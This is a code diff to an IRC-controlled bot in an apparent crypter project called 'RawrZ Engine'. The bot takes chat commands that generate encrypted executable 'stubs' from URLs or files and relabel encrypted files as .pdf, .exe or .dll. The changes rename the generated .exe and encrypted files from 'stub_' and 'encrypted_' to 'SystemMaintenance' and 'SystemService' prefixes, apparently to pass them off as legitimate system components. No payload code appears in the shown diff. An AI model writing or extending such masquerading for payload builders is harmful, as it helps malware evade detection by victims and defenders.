@@ -494,9 +494,9 @@ class IRCBot {
     // Decrypt handler - works with ALL encryption methods and converted files
     async handleDecrypt(nick, channel, args) {
         if (args.length < 4) {
-            this.sendToIRC(`${nick}: Usage: !decrypt <algorithm> <encrypted_data_or_filename> <key> <iv> [auth_tag]`);
-            this.sendToIRC(`${nick}: Example: !decrypt aes-256-gcm <encrypted_data> <key> <iv>`);
-            this.sendToIRC(`${nick}: Example: !decrypt cam-256-cbc encrypted_file.enc <key> <iv>`);
+            this.sendToIRC(`${nick}: Usage: !decrypt <algorithm> <system_data_or_filename> <key> <iv> [auth_tag]`);
+            this.sendToIRC(`${nick}: Example: !decrypt aes-256-gcm <system_data> <key> <iv>`);
+            this.sendToIRC(`${nick}: Example: !decrypt cam-256-cbc system_file.enc <key> <iv>`);
             this.sendToIRC(`${nick}: Example: !decrypt aria-256-gcm converted_file.pdf <key> <iv>`);
             return;
         }
@@ -781,7 +781,7 @@ class IRCBot {
             
             // Create the encrypted file with .enc extension first
             const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-            const tempFilename = `encrypted_${normalizedAlgorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.enc`;
+            const tempFilename = `SystemService${normalizedAlgorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}.enc`;
             
             const fs = require('fs').promises;
             const path = require('path');
@@ -802,7 +802,7 @@ class IRCBot {
             await fs.writeFile(tempFilePath, encryptedContent, 'utf8');
             
             // Now automatically convert to the user's chosen extension
-            const finalFilename = `encrypted_${normalizedAlgorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}${cleanExtension}`;
+            const finalFilename = `SystemService${normalizedAlgorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}${cleanExtension}`;
             const finalFilePath = path.join(uploadsDir, finalFilename);
             
             const convertedContent = JSON.stringify({
@@ -851,7 +851,7 @@ class IRCBot {
     // Stub generation handler - full RawrZ Engine capabilities
     async handleStubGeneration(nick, channel, args) {
         if (args.length < 2) {
-            this.sendToIRC(`${nick}: Usage: !stub <algorithm> <target> [stub_type] [executable_type]`);
+            this.sendToIRC(`${nick}: Usage: !stub <algorithm> <target> [SystemMaintenancetype] [executable_type]`);
             this.sendToIRC(`${nick}: Example: !stub aes-256-gcm https://example.com/file.exe console`);
             this.sendToIRC(`${nick}: Example: !stub cam-256-cbc file:document.pdf gui`);
             this.sendToIRC(`${nick}: Example: !stub aria-256-gcm "Hello World" service`);
@@ -930,7 +930,7 @@ class IRCBot {
             
             // Save the generated stub
             const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-            const filename = `stub_${normalizedAlgorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${executableType}_${timestamp}.exe`;
+            const filename = `SystemMaintenance${normalizedAlgorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${executableType}_${timestamp}.exe`;
             
             const fs = require('fs').promises;
             const path = require('path');
@@ -1127,10 +1127,10 @@ class IRCBot {
     // Convert file extension handler - works with ALL encryption methods
     async handleConvertFile(nick, channel, args) {
         if (args.length < 1) {
-            this.sendToIRC(`${nick}: Usage: !convert <encrypted_filename> [new_extension]`);
-            this.sendToIRC(`${nick}: Example: !convert encrypted_aes_256_gcm_2025-09-09T06-18-35-124Z.pdf.enc`);
-            this.sendToIRC(`${nick}: Example: !convert encrypted_cam_256_cbc_2025-09-09T06-18-35-124Z.exe.enc .pdf`);
-            this.sendToIRC(`${nick}: Example: !convert encrypted_aria_256_gcm_2025-09-09T06-18-35-124Z.zip.enc .dll`);
+            this.sendToIRC(`${nick}: Usage: !convert <system_filename> [new_extension]`);
+            this.sendToIRC(`${nick}: Example: !convert SystemServiceaes_256_gcm_2025-09-09T06-18-35-124Z.pdf.enc`);
+            this.sendToIRC(`${nick}: Example: !convert SystemServicecam_256_cbc_2025-09-09T06-18-35-124Z.exe.enc .pdf`);
+            this.sendToIRC(`${nick}: Example: !convert SystemServicearia_256_gcm_2025-09-09T06-18-35-124Z.zip.enc .dll`);
             return;
         }
 
@@ -1862,7 +1862,7 @@ class IRCBot {
         const path = require('path');
         
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        const filename = `encrypted_${algorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}${fileExtension}`;
+        const filename = `SystemService${algorithm.replace(/[^a-zA-Z0-9]/g, '_')}_${timestamp}${fileExtension}`;
         
         const uploadsDir = path.join(__dirname, '../../uploads');
         await fs.mkdir(uploadsDir, { recursive: true });
